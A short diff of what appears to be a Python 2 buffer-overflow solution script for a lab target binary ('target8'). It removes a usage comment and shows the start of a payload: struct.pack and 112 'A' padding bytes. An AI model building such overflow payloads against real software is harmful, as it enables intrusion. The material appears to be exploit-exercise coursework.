@@ -1,6 +1,5 @@
 #!/usr/bin/env python2
-#HOW IT SHOULD BE RAN
-#./target8 "$(python sol8.py)"
+
 from struct import pack
 
 p = 'A'*112
